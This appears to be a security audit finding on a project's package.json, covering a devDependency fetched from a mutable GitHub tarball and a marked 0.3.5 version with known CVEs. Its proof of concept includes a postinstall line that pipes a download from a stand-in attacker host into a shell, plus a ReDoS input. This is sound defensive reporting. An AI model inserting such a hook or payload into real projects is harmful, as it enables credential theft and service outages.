## Summary

The `package.json` for this project contains two classes of vulnerability:

1. **Supply chain RCE (primary):** The `grunt-if` devDependency is pinned to a live, mutable GitHub branch-head tarball (`https://github.com/binarymist/grunt-if/tarball/master`) rather than an immutable npm registry release. This means every `npm install` silently fetches whatever code is currently at that URL, with no content-integrity guarantee. A single upstream repository compromise results in arbitrary code execution on every developer workstation and CI/CD runner that subsequently runs `npm install`.

2. **Known-CVE production dependencies (secondary):** Several production dependencies are pinned to versions carrying documented CVEs — including a ReDoS/XSS in `marked`, an abandoned bcrypt implementation with no upstream security support, and outdated `helmet`, `express-session`, and `mongodb` driver releases.

---

## Vulnerability Details

### Finding 1 — Mutable GitHub Tarball Dependency (CWE-1395)

```
"grunt-if": "https://github.com/binarymist/grunt-if/tarball/master"
```

Unlike packages installed from the npm registry, GitHub tarball URLs pointing to a branch head (`master`) are **not content-addressable**:

- npm's `package-lock.json` records the resolved URL but cannot enforce a content hash against a remote tarball the way it does for registry packages. A compromised upstream repository can serve entirely different code at the same URL without the lock file detecting the substitution.
- `npm ci` provides lockfile reproducibility for the *URL* but not *content integrity* for remote tarballs.
- There is no Subresource Integrity (SRI) mechanism applied to npm tarball fetches from arbitrary GitHub URLs.

Any `postinstall` script or patched module entrypoint introduced by an attacker in the upstream repository would execute automatically with the privileges of the installing process — typically the CI/CD service account — enabling credential exfiltration, reverse shell installation, or tampering with build artifacts before deployment.

### Finding 2 — Known-Vulnerable Production Dependencies (CWE-1104)

| Package | Pinned Version | Issue |
|---|---|---|
| `marked` | `0.3.5` | CVE-2017-1000427 (XSS); CVE-2017-16114 (ReDoS) |

## Proof of Concept

**Supply chain attack path (no code execution required from the victim):**

1. Attacker gains write access to `https://github.com/binarymist/grunt-if` (account takeover, compromised personal access token, or malicious PR merged by maintainer).
2. Attacker pushes a commit to `master` adding a malicious `postinstall` script to `package.json`:
   ```json
   "scripts": {
     "postinstall": "curl -s https://attacker.example.com/exfil | sh"
   }
   ```
3. Any developer, automated pipeline, or Docker build that subsequently runs `npm install` (without `--ignore-scripts`, which is non-default) fetches and executes the malicious payload.
4. The CI/CD runner's environment variables — `AWS_ACCESS_KEY_ID`, `NPM_TOKEN`, `GITHUB_TOKEN`, database credentials, etc. — are exfiltrated silently.

**Marked ReDoS (CVE-2017-16114) — application-level:**

```js
// Any user-controlled input rendered through marked 0.3.5
const marked = require('marked');
const payload = '[' + '\\['.repeat(50000); // catastrophic backtracking
console.time('redos');
marked(payload);  // process hangs; event loop blocked
console.timeEnd('redos');
```

## Validation

- **Reachability:** Confirmed. The `grunt-if` tarball URL is present in the committed `package.json`. Any environment executing `npm install` (the default for development and CI) fetches this dependency. The `grunt-if` package is consumed by the `precommit` and `test` npm scripts, which run in every standard developer and CI workflow.
- **Lock file does not mitigate:** `package-lock.json` stores the resolved URL, not a content digest for remote tarballs. Content served at the URL can be replaced without invalidating the lockfile entry.
- **Confidence:** Medium — exploitation requires a prerequisite upstream repository compromise, which raises attack complexity (reflected in AC:H in the CVSS vector). However, no victim-side control can detect or prevent this class of attack once the upstream is compromised.
- **Mitigating factor:** `grunt-if` is a devDependency; it does not ship in the production runtime bundle, limiting the direct blast radius to developer machines and CI/CD infrastructure (which, in practice, hold the highest-value credentials in most organisations).

## Additional Hardening

1. **Enforce `npm ci` in all CI/CD pipelines** — ensures the lockfile is used verbatim and prevents implicit dependency resolution during automated builds. See: [npm ci docs](https://docs.npmjs.com/cli/v10/commands/npm-ci).

2. **Add `npm audit --audit-level=high` as a required pre-merge CI gate** — automatically blocks merges when new high/critical CVEs are introduced in any dependency.

3. **Enable GitHub Dependabot or Renovate** — configure automated PRs for dependency version drift so CVEs are surfaced and patched without manual tracking. See: [Dependabot security updates](https://docs.github.com/en/code-security/dependabot/dependabot-security-updates/about-dependabot-security-updates).

4. **Audit all remaining GitHub tarball / raw URL references** — grep the repository for `github.com/*/tarball`, `github.com/*/archive`, and `raw.githubusercontent.com` in any `package.json` files. None of these patterns provides content-addressable integrity.

5. **Consider a private npm proxy (Artifactory, Verdaccio)** — proxying all registry traffic through an internal mirror allows security scanning of packages at ingress and provides a policy enforcement point for blocking non-registry sources.
